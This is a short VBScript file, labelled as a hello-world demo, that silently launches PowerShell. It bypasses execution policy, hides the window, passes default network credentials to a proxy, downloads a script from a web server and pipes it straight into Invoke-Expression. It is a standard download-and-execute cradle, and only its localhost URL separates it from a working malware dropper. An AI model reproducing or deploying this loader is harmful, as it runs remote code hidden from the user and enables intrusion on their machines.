'******************************************************************************
' *
' * This File Downloads hellow-world.ps1 script and runs it at powershell
' * NOTE! Uri Value must be Valid, Web Server Works on Specified Port
' *
'******************************************************************************
btnRunHelloWorld_OnClick()

Sub btnRunHelloWorld_OnClick()

Dim wshShell, szCmd
Set wshShell = CreateObject("WScript.Shell")
szCmd = "powershell -NoP -NonI -exec Bypass -WindowStyle Hidden -c ""Set-ExecutionPolicy Bypass -Scope Process -Force; (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;(Invoke-WebRequest -Uri 'http://localhost:80/Hello-World/assets/Scripts/hellow-world.ps1' -Method GET -ContentType 'text/plain; charset=utf-8' -UseBasicParsing)|iex"""
wshShell.Run szCmd 
End Sub
